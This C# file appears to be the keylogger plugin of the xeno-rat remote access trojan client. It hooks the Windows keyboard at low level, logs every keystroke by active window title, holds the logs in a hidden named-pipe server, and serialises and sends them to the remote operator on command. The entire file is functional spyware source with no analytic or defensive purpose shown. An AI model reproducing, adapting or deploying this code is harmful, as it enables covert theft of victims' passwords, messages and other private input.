using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        bool started = false;
        bool owner = true;
        bool FULLSTOP = false;
        IntPtr key_hook= IntPtr.Zero;
        CancellationTokenSource FULLSTOP_token = new CancellationTokenSource();
        Dictionary<string, string> applicationkeylogs;
        string pipename = "OfflineKeyloggerPipe";
        NamedPipeClientStream client;
        Node node;

        /// <summary>
        /// Runs the server-side integration with proper error handling.
        /// </summary>
        /// <param name="node">The node to run the integration with.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the integration process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method runs the server-side integration with the provided <paramref name="node"/>.
        /// It ensures proper error handling and communication with the node.
        /// If the named pipe does not exist, it starts the server. Otherwise, it connects to the existing pipe as a client.
        /// It handles various incoming data signals and performs corresponding actions.
        /// If an exception occurs during the integration process, it disconnects the node and breaks the loop.
        /// </remarks>
        public async Task Run(Node node)// get server side intergation (I mean like xeno-rat gui) into this too (of course). Oh and last but not least, PROPER ERROR HANDLING, this is a mess waiting to happen!
        {
            await node.SendAsync(new byte[] { 3 });
            this.node = node;
            try
            {
                if (!PipeExists())
                {
                    StartServer();
                }
                else
                {
                    owner = false;
                    client = new NamedPipeClientStream(".", pipename, PipeDirection.InOut, PipeOptions.Asynchronous);
                    await client.ConnectAsync();
                }
                await node.SendAsync(new byte[] { 1 });
            }
            catch 
            {
                await node.SendAsync(new byte[] { 0 });
                await Task.Delay(1000);
                return;
            }
            while (node.Connected()) 
            {
                try
                {
                    byte[] data = await node.ReceiveAsync();
                    Console.WriteLine(data[0]);
                    if (data == null)
                    {
                        break;
                    }
                    else if (data[0] == 0)
                    {
                        byte[] hasstarted = new byte[] { 0 };
                        if (await IsStarted())
                        {
                            hasstarted = new byte[] { 1 };
                        }
                        await node.SendAsync(hasstarted);
                    }
                    else if (data[0] == 1)
                    {
                        Console.WriteLine("start");
                        Start();
                    }
                    else if (data[0] == 2)
                    {
                        await Stop();
                    }
                    else if (data[0] == 3)
                    {
                        Dictionary<string, string> logs = await GetKeylogs();
                        byte[] dict_data = ConvertDictionaryToBytes(logs);
                        await node.SendAsync(dict_data);

                    }
                    else if (data[0] == 4)
                    {
                        await DO_FULLSTOP();
                        node.Disconnect();
                        break;
                    }
                }
                catch (Exception e)
                {
                    node.Disconnect();
                    break;
                }
            }
            if (owner) 
            {
                while (!FULLSTOP) 
                {
                    await Task.Delay(1000);
                }
            }

        }

        /// <summary>
        /// Checks if a named pipe exists.
        /// </summary>
        /// <returns>True if the named pipe exists; otherwise, false.</returns>
        public bool PipeExists() 
        {
            return Directory.GetFiles(@"\\.\pipe\").Contains($@"\\.\pipe\{pipename}");
        }

        /// <summary>
        /// Asynchronously starts the server and handles incoming connections.
        /// </summary>
        /// <remarks>
        /// This method initializes a dictionary to store application key logs and enters a loop to handle incoming connections.
        /// Within the loop, a NamedPipeServerStream is created with the specified pipe name, direction, buffer size, transmission mode, and options.
        /// The method then awaits a connection and checks for the FULLSTOP flag to determine whether to continue processing connections.
        /// If the FULLSTOP flag is set, the server is disposed and the loop is exited. Otherwise, the incoming connection is handled by the Handler method.
        /// </remarks>
        public async Task StartServer() 
        {

            applicationkeylogs = new Dictionary<string, string>();
            //keylogloop();
            while (!FULLSTOP)
            {
                NamedPipeServerStream server = new NamedPipeServerStream(pipename, PipeDirection.InOut, 254, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
                await server.WaitForConnectionAsync(FULLSTOP_token.Token);
                if (FULLSTOP)
                {
                    server.Dispose();
                    break;
                }
                Handler(server);
            }
        }

        /// <summary>
        /// Handles the communication with the named pipe server stream.
        /// </summary>
        /// <param name="server">The named pipe server stream to be handled.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method continuously reads from the named pipe server stream and processes the received data based on the value of the received byte.
        /// If the received byte is 1, it sends a response indicating whether the handler has started.
        /// If the received byte is 2, it sets the 'started' flag to true.
        /// If the received byte is 3, it sets the 'started' flag to false.
        /// If the received byte is 4, it sends a response containing application keylogs data to the client.
        /// If the received byte is 5, it sets the 'FULLSTOP' flag to true, cancels the token, disposes resources, and returns from the method.
        /// </remarks>
        public async Task Handler(NamedPipeServerStream server) 
        {
            while (!FULLSTOP)
            {
                byte[] recv = new byte[] { 0 };
                int recvlen = 0;
                try
                {
                    recvlen = await server.ReadAsync(recv, 0, 1, FULLSTOP_token.Token);
                }
                catch { }
                if (recvlen == 0)
                {
                    try
                    {
                        server.Disconnect();
                    }
                    catch { }
                    server.Dispose();
                    break;
                }
                if (recv[0] == 1)
                {
                    byte istarted = 0;
                    if (started)
                    {
                        istarted = 1;
                    }
                    try
                    {
                        await server.WriteAsync(new byte[] { 1, istarted }, 0, 2);
                    }
                    catch { }
                }
                else if (recv[0] == 2)
                {
                    started = true;
                }
                else if (recv[0] == 3)
                {
                    started = false;
                }
                else if (recv[0] == 4)
                {
                    try
                    {
                        byte[] op = new byte[] { 4 };
                        byte[] payload = ConvertDictionaryToBytes(applicationkeylogs);
                        byte[] length = node.sock.IntToBytes(payload.Length);
                        byte[] partial_payload = SocketHandler.Concat(length, payload);
                        byte[] final_payload = SocketHandler.Concat(op, partial_payload);
                        await server.WriteAsync(final_payload, 0, final_payload.Length);
                    }
                    catch { }
                }
                else if (recv[0] == 5) 
                {
                    FULLSTOP = true;
                    try
                    {
                        FULLSTOP_token.Cancel();
                        FULLSTOP_token.Dispose();
                        server.Dispose();
                    }
                    catch { }
                    return;
                }
            }

        }

        /// <summary>
        /// Stops the operation and performs cleanup if the owner flag is set, otherwise sends a termination signal to the client.
        /// </summary>
        /// <exception cref="InvalidOperationException">Thrown when the operation is not owned by the current instance.</exception>
        /// <returns>Void</returns>
        /// <remarks>
        /// If the <paramref name="owner"/> flag is set, this method sets the <see cref="FULLSTOP"/> flag to true, cancels the <see cref="FULLSTOP_token"/>, disposes the <see cref="FULLSTOP_token"/>, and unregisters the <see cref="key_hook"/> if it is not equal to <see cref="IntPtr.Zero"/>.
        /// If the <paramref name="owner"/> flag is not set, this method sends a termination signal to the client by writing a byte array with a value of 5 asynchronously.
        /// </remarks>
        public async Task DO_FULLSTOP() 
        {
            if (owner) 
            {
                FULLSTOP = true;
                FULLSTOP_token.Cancel();
                FULLSTOP_token.Dispose();
                if (key_hook != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(key_hook);
                    key_hook = IntPtr.Zero;
                }
                return;
            }
            try
            {
                await client.WriteAsync(new byte[] { 5 }, 0, 1);
            }
            catch { }
        }

        /// <summary>
        /// Callback function for keyboard hook.
        /// </summary>
        /// <param name="nCode">The hook code.</param>
        /// <param name="wParam">The parameter of the message.</param>
        /// <param name="lParam">The parameter of the message.</param>
        /// <returns>The result of calling the next hook procedure in the hook chain.</returns>
        /// <remarks>
        /// This method is a callback function for a keyboard hook. It checks if the hook has started and if the hook code is greater than or equal to 0 and the message parameter is WM_KEYDOWN.
        /// If the conditions are met, it reads the virtual key code from the message parameter and checks if the Shift key is pressed.
        /// It then retrieves the character corresponding to the virtual key code and appends it to the active application's key log.
        /// If the Caps Lock is on, it converts the character to uppercase.
        /// The key log is stored in a dictionary with the active application's caption as the key.
        /// </remarks>
        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (started && nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
                string open_application = Utils.GetCaptionOfActiveWindow().Replace("*", "");
                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
                {
                    character = character.ToUpper();
                }
                if (!applicationkeylogs.ContainsKey(open_application))
                {
                    applicationkeylogs.Add(open_application, "");
                }
                applicationkeylogs[open_application] += character;
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        /// <summary>
        /// Asynchronously listens for key inputs and logs them based on the active application.
        /// </summary>
        /// <remarks>
        /// This method continuously listens for key inputs and logs them based on the active application.
        /// It checks for the active application and logs the key inputs in the respective application's log.
        /// The method runs asynchronously and stops when the global flag FULLSTOP is set to true.
        /// </remarks>
        public async Task keylogloop() 
        {
            while (!FULLSTOP) 
            {
                if (!started) 
                {
                    await Task.Delay(1000);
                }
                string retchar = await GetKey();
                if (retchar != null)
                {
                    string open_application = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*","");
                    if (!applicationkeylogs.ContainsKey(open_application)) 
                    {
                        applicationkeylogs.Add(open_application, "");
                    }
                    applicationkeylogs[open_application] += retchar;
                }
            }
        }

        /// <summary>
        /// Converts a dictionary of string key-value pairs to a byte array and returns the result.
        /// </summary>
        /// <param name="dictionary">The dictionary to be converted to a byte array.</param>
        /// <returns>A byte array representing the key-value pairs in the input <paramref name="dictionary"/>.</returns>
        /// <remarks>
        /// This method iterates through each key-value pair in the input <paramref name="dictionary"/> and converts the keys and values to bytes using UTF-8 encoding.
        /// It appends a null terminator between each key and value, as well as between each pair of values.
        /// The resulting byte array represents the serialized form of the input dictionary.
        /// </remarks>
        private static byte[] ConvertDictionaryToBytes(Dictionary<string, string> dictionary)
        {
            List<byte> byteList = new List<byte>();

            foreach (var kvp in dictionary)
            {
                byteList.AddRange(Encoding.UTF8.GetBytes(kvp.Key));
                byteList.Add(0); // Null terminator between key and value
                byteList.AddRange(Encoding.UTF8.GetBytes(kvp.Value));
                byteList.Add(0); // Null terminator between value pairs
            }

            return byteList.ToArray();
        }

        /// <summary>
        /// Converts a byte array to a dictionary of strings using null-terminated keys and values.
        /// </summary>
        /// <param name="data">The byte array to be converted.</param>
        /// <param name="offset">The starting offset in the byte array.</param>
        /// <returns>A dictionary containing the keys and values extracted from the byte array.</returns>
        /// <remarks>
        /// This method iterates through the byte array starting from the specified offset and extracts null-terminated keys and values to populate a dictionary.
        /// The null terminator (byte value 0) is used to indicate the end of a key or a value.
        /// The method uses a StringBuilder to accumulate characters until a null terminator is encountered, at which point the accumulated string is added to the dictionary as a key or value.
        /// </remarks>
        private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            string currentKey = null;
            StringBuilder currentValue = new StringBuilder();

            for (int i = offset; i < data.Length; i++)
            {
                byte currentByte = data[i];

                if (currentByte == 0)
                {
                    // Null terminator indicates the end of a key or a value
                    if (currentKey == null)
                    {
                        currentKey = currentValue.ToString(); // Use ToString to get the string
                        currentValue.Clear();
                    }
                    else
                    {
                        dictionary[currentKey] = currentValue.ToString(); // Use ToString to get the string
                        currentKey = null;
                        currentValue.Clear();

                    }
                }
                else
                {
                    currentValue.Append((char)currentByte);
                }
            }

            return dictionary;
        }

        /// <summary>
        /// Retrieves keylogs from the client application.
        /// </summary>
        /// <param name="count">The number of attempts to retrieve keylogs. Defaults to 0.</param>
        /// <returns>A dictionary containing the keylogs from the application.</returns>
        /// <remarks>
        /// This method retrieves keylogs from the client application. It makes use of asynchronous operations to communicate with the client and retrieve the keylogs.
        /// If the number of attempts to retrieve keylogs exceeds 3, it returns null.
        /// If the owner flag is set, it returns the application keylogs.
        /// If the initial byte received is 4, it reads the length of the keylogs and then retrieves the keylogs accordingly.
        /// If an exception occurs during the retrieval process, it retries to retrieve the keylogs.
        /// </remarks>
        public async Task<Dictionary<string, string>> GetKeylogs(int count=0) 
        {
            if (count > 3)
            {
                return null;
            }
            if (owner)
            {
                return applicationkeylogs;
            }
            await client.WriteAsync(new byte[] { 4 }, 0, 1);
            byte[] recv_buf = new byte[] { 0, 0,0,0,0 };
            CancellationTokenSource token = new CancellationTokenSource(2000);
            try
            {
                await client.ReadAsync(recv_buf, 0, 5, token.Token);
            }
            catch { }
            token.Dispose();
            if (recv_buf[0] == 4)
            {
                int len= node.sock.BytesToInt(recv_buf, 1);
                token = new CancellationTokenSource(5000);
                recv_buf=new byte[len];
                int recvied = 0;
                try
                {
                    int totalBytesReceived = 0;

                    while (totalBytesReceived < len)
                    {
                        recvied = await client.ReadAsync(recv_buf, totalBytesReceived, len - totalBytesReceived, token.Token);
                        if (recvied == 0)
                        {
                            recvied = 0;
                            break;
                        }
                        totalBytesReceived += recvied;
                    }
                }
                catch 
                {
                    recvied = 0;
                }
                token.Dispose();
                if (recvied == 0) 
                { 
                    return await GetKeylogs(count + 1);
                }
                return ConvertBytesToDictionary(recv_buf, 0);
            }
            else
            {
                return await GetKeylogs(count + 1);
            }

        }

        /// <summary>
        /// Starts the asynchronous keyboard hook.
        /// </summary>
        /// <remarks>
        /// This method starts an asynchronous keyboard hook if the <paramref name="owner"/> is true and the hook has not already been started.
        /// The method sets a Windows hook for low-level keyboard input events using the <see cref="SetWindowsHookEx"/> function.
        /// It then starts a new thread to run the hook and, if the application is not running a message loop, starts the application message loop using <see cref="Application.Run"/>.
        /// If the hook is already started or the <paramref name="owner"/> is false, the method sends a byte array with a value of 2 to the client asynchronously using <see cref="client.WriteAsync"/>.
        /// </remarks>
        /// <exception cref="InvalidOperationException">Thrown if the hook is already started.</exception>
        /// <returns>
        /// If the <paramref name="owner"/> is true and the hook has not already been started, no value is returned.
        /// If the hook is already started or the <paramref name="owner"/> is false, the method returns an asynchronous task.
        /// </returns>
        public async Task Start() 
        {
            if (owner && !started)
            {
                HookCallbackDelegate hcDelegate = HookCallback;
                Process currproc = Process.GetCurrentProcess();
                string mainModuleName = currproc.MainModule.ModuleName;
                currproc.Dispose(); started = true;
                new Thread(() =>
                {
                    key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
                    if (!Application.MessageLoop)
                    {
                        Application.Run();
                    }
                }).Start();
                return;
            }
            await client.WriteAsync(new byte[] { 2 }, 0, 1);
        }

        /// <summary>
        /// Stops the process of capturing keyboard inputs and releases the associated resources.
        /// </summary>
        /// <remarks>
        /// If the <paramref name="owner"/> flag is set, the method sets the <paramref name="started"/> flag to false and releases the <paramref name="key_hook"/> resource if it is not equal to <see cref="IntPtr.Zero"/>.
        /// If the <paramref name="owner"/> flag is not set, the method sends a byte array with value 3 to the <paramref name="client"/> using the <see cref="WriteAsync"/> method and awaits the completion of the write operation.
        /// </remarks>
        /// <exception cref="InvalidOperationException">Thrown when attempting to stop the process without ownership.</exception>
        /// <returns>Void</returns>
        public async Task Stop()
        {
            if (owner)
            {
                started = false;

                if (key_hook != IntPtr.Zero) 
                {
                    UnhookWindowsHookEx(key_hook);
                    key_hook= IntPtr.Zero;
                }

                return;
            }
            await client.WriteAsync(new byte[] { 3 }, 0, 1);
        }

        /// <summary>
        /// Checks if the process is started and returns a boolean value.
        /// </summary>
        /// <param name="count">The number of attempts made to check if the process is started. Default is 0.</param>
        /// <returns>True if the process is started; otherwise, false.</returns>
        /// <exception cref="System.TimeoutException">Thrown when the operation times out.</exception>
        /// <remarks>
        /// This method checks if the process is started by sending a byte to the client and reading a response.
        /// If the count exceeds 3, it returns false.
        /// If the owner is true, it returns the value of 'started'.
        /// If the received byte is 1, it returns true if the second byte is also 1; otherwise, it returns false.
        /// If the received byte is not 1, it recursively calls itself with an incremented count until a valid response is received or the count exceeds 3.
        /// </remarks>
        public async Task<bool> IsStarted(int count=0) 
        {
            if (count > 3) 
            {
                return false;
            }
            if (owner) 
            {
                return started;
            }
            await client.WriteAsync(new byte[] { 1 }, 0, 1);
            byte[] recv_buf=new byte[] { 0, 0};
            CancellationTokenSource token = new CancellationTokenSource(3000);
            await client.ReadAsync(recv_buf, 0, 2, token.Token);
            token.Dispose();
            if (recv_buf[0] == 1)
            {
                return recv_buf[1] == 1;
            }
            else 
            {
                return await IsStarted(count + 1);
            }
        }

        /// <summary>
        /// Asynchronously retrieves the character corresponding to the key pressed.
        /// </summary>
        /// <returns>
        /// The character corresponding to the key pressed, or null if no key is pressed.
        /// </returns>
        /// <remarks>
        /// This method asynchronously retrieves the character corresponding to the key pressed. It iterates through the virtual key codes (0-255) and checks the state of each key using GetAsyncKeyState function. If a key is pressed, it retrieves the character corresponding to the key and returns it. The method uses the keyStates array to keep track of the state of each key. The method is asynchronous and returns a Task<string>.
        /// </remarks>
        private async Task<string> GetKey()
        {
            return await Task.Run(() =>
            {
                for (int i = 0; i < 255; i++)
                {
                    short state = GetAsyncKeyState(i);

                    if ((state & 0x8000) != 0 && !keyStates[i])
                    {
                        keyStates[i] = true;

                        bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                        string character = GetCharacterFromKey((uint)i, isShiftPressed);
                        return character;
                    }
                    else if ((state & 0x8000) == 0 && keyStates[i])
                    {
                        keyStates[i] = false;
                    }
                }
                return null;
            });
        }


        private static Dictionary<uint, string> nonVisibleCharacters = new Dictionary<uint, string>()
        {
            { 0x08, "[backspace]" },
            { 0x09, "[tab]" },
            { 0x0D, "[enter]" },
            { 0x1B, "[escape]" },
            { 0x20, "[space]" },
            { 0x2E, "[delete]" },
            { 0x25, "[left]" },
            { 0x26, "[up]" },
            { 0x27, "[right]" },
            { 0x28, "[down]" },
            { 0x2C, "[print screen]" },
            { 0x2D, "[insert]" },
            { 0x2F, "[help]" },
            { 0x5B, "[left windows]" },
            { 0x5C, "[right windows]" },
            { 0x5D, "[applications]" },
            { 0x5F, "[sleep]" },
            { 0x70, "[F1]" },
            { 0x71, "[F2]" },
            { 0x72, "[F3]" },
            { 0x73, "[F4]" },
            { 0x74, "[F5]" },
            { 0x75, "[F6]" },
            { 0x76, "[F7]" },
            { 0x77, "[F8]" },
            { 0x78, "[F9]" },
            { 0x79, "[F10]" },
            { 0x7A, "[F11]" },
            { 0x7B, "[F12]" },
            { 0xBA, ";" },
            { 0xBB, "=" },
            { 0xBC, "," },
            { 0xBD, "-" },
            { 0xBE, "." },
            { 0xBF, "/" },
            { 0xC0, "`" },
            { 0xDB, "[" },
            { 0xDC, "\\" },
            { 0xDD, "]" },
            { 0xDE, "'" },
            { 0xDF, "[caps lock]" },
            { 0xE1, "[ime hangul mode]" },
            { 0xE3, "[ime junja mode]" },
            { 0xE4, "[ime final mode]" },
            { 0xE5, "[ime kanji mode]" },
            { 0xE6, "[ime hanja mode]" },
            { 0xE8, "[ime off]" },
            { 0xE9, "[ime on]" },
            { 0xEA, "[ime convert]" },
            { 0xEB, "[ime non-convert]" },
            { 0xEC, "[ime accept]" },
            { 0xED, "[ime mode change request]" },
            { 0xF1, "[oem specific]" },
            { 0xFF, "[oem auto]" },
            { 0xFE, "[oem enlarge window]" },
            { 0xFD, "[oem reduce window]" },
            { 0xFC, "[oem copy]" },
            { 0xFB, "[oem enlarge font]" },
            { 0xFA, "[oem reduce font]" },
            { 0xF9, "[oem jump]" },
            { 0xF8, "[oem pa1]" },
            { 0xF7, "[oem clear]" }
        };

        private static bool[] keyStates = new bool[256];

        /// <summary>
        /// Retrieves the character corresponding to the specified virtual key code, considering the Shift key state.
        /// </summary>
        /// <param name="virtualKeyCode">The virtual key code for which to retrieve the character.</param>
        /// <param name="isShiftPressed">A boolean value indicating whether the Shift key is pressed.</param>
        /// <returns>
        /// The character corresponding to the specified <paramref name="virtualKeyCode"/> considering the state of the Shift key.
        /// If no character is found, an empty string is returned.
        /// </returns>
        /// <remarks>
        /// This method retrieves the character corresponding to the specified virtual key code, considering the state of the Shift key.
        /// It also handles non-visible characters by replacing them with descriptive words using a predefined dictionary.
        /// If the Shift key is pressed, it applies modifications to certain non-visible characters based on their original representation.
        /// </remarks>
        private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
        {
            StringBuilder receivingBuffer = new StringBuilder(5);
            byte[] keyboardState = new byte[256];

            // Set the state of Shift key based on the passed parameter
            keyboardState[0x10] = (byte)(isShiftPressed ? 0x80 : 0);

            // Map the virtual key to the corresponding character
            int result = ToUnicode(virtualKeyCode, 0, keyboardState, receivingBuffer, receivingBuffer.Capacity, 0);

            if (result > 0)
            {
                string character = receivingBuffer.ToString();

                // Replace non-visible characters with descriptive words using the dictionary
                if (nonVisibleCharacters.ContainsKey(virtualKeyCode))
                {
                    string nonVisibleCharacter = nonVisibleCharacters[virtualKeyCode];

                    // Apply Shift key state to the non-visible character
                    if (isShiftPressed)
                    {
                        // Apply Shift key modifications based on the non-visible character
                        switch (nonVisibleCharacter)
                        {
                            case ";":
                                return ":";
                            case "=":
                                return "+";
                            case ",":
                                return "<";
                            case "-":
                                return "_";
                            case ".":
                                return ">";
                            case "/":
                                return "?";
                            case "`":
                                return "~";
                            case "[":
                                return "{";
                            case "\\":
                                return "|";
                            case "]":
                                return "}";
                            case "'":
                                return "\"";
                        }
                    }

                    return nonVisibleCharacter;
                }

                return character;
            }

            return string.Empty;
        }

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled on or off (in the low-order bit) and whether the key was pressed after the previous call to GetAsyncKeyState.
        /// </summary>
        /// <param name="vKey">The virtual-key code.</param>
        /// <returns>The return value specifies whether the key was pressed since the last call to GetAsyncKeyState, and whether the key is currently up or down.</returns>
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off—alternating each time the key is pressed).
        /// </summary>
        /// <param name="keyCode">The virtual-key code.</param>
        /// <returns>The return value specifies the status of the specified virtual key, as follows:
        /// If the high-order bit is 1, the key is down; otherwise, it is up.
        /// If the low-order bit is 1, the key is toggled. A key, such as the CAPS LOCK key, is toggled if it is turned on. The key is off and untoggled if the low-order bit is 0. A toggle key's indicator light (if any) on the keyboard will be on when the key is toggled, and off when the key is untoggled.
        /// </returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Sets an application-defined hook procedure for a hook.
        /// </summary>
        /// <param name="idHook">The type of hook procedure to be installed.</param>
        /// <param name="lpfn">A pointer to the hook procedure.</param>
        /// <param name="wParam">The handle to the DLL containing the hook procedure pointed to by the lpfn parameter.</param>
        /// <param name="lParam">The thread identifier associated with the hook procedure pointed to by the lpfn parameter.</param>
        /// <returns>
        /// If the function succeeds, the return value is the handle to the hook procedure.
        /// If the function fails, the return value is NULL.
        /// </returns>
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);

        /// <summary>
        /// Unhooks a Windows hook or a hook procedure installed in a hook chain by the SetWindowsHookEx function.
        /// </summary>
        /// <param name="hhk">A handle to the hook to be removed. This parameter is a hook handle obtained by a previous call to SetWindowsHookEx.</param>
        /// <returns>true if the function succeeds, otherwise false.</returns>
        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        /// <summary>
        /// Retrieves a module handle for the specified module.
        /// </summary>
        /// <param name="lpModuleName">The name of the loaded module (either a .dll or .exe file) or null to retrieve the handle of the calling module.</param>
        /// <returns>
        /// If the function succeeds, the return value is a handle to the specified module.
        /// If the function fails, the return value is null. To get extended error information, call GetLastError.
        /// </returns>
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Calls the next hook procedure in the hook chain.
        /// </summary>
        /// <param name="hhk">A handle to the hook to be skipped.</param>
        /// <param name="nCode">The hook code passed to the current hook procedure.</param>
        /// <param name="wParam">The wParam value passed to the current hook procedure.</param>
        /// <param name="lParam">The lParam value passed to the current hook procedure.</param>
        /// <returns>The return value is the result of calling the next hook procedure in the chain. The value is returned by the next hook procedure in the chain. The current hook procedure must also return this value. The meaning of the return value depends on the hook type.</returns>
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        /// <summary>
        /// Calls the ToUnicode function in the user32.dll to translate the specified virtual-key code and keyboard state to the corresponding Unicode character or characters.
        /// </summary>
        /// <param name="virtualKeyCode">The virtual-key code to be translated.</param>
        /// <param name="scanCode">The hardware scan code of the key to be translated.</param>
        /// <param name="keyboardState">The current keyboard state. This parameter should contain an array of 256 bytes.</param>
        /// <param name="receivingBuffer">A pointer to the buffer that receives the translated Unicode character or characters.</param>
        /// <param name="bufferSize">The size, in wide characters, of the buffer pointed to by the <paramref name="receivingBuffer"/> parameter.</param>
        /// <param name="flags">The behavior of the function. This parameter can be set to 0 or 1.</param>
        /// <returns>Returns the number of characters written to the buffer, or -1 if the function fails.</returns>
        /// <exception cref="System.EntryPointNotFoundException">The user32.dll does not contain the entry point for the ToUnicode function.</exception>
        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
            int bufferSize, uint flags);
    }
}
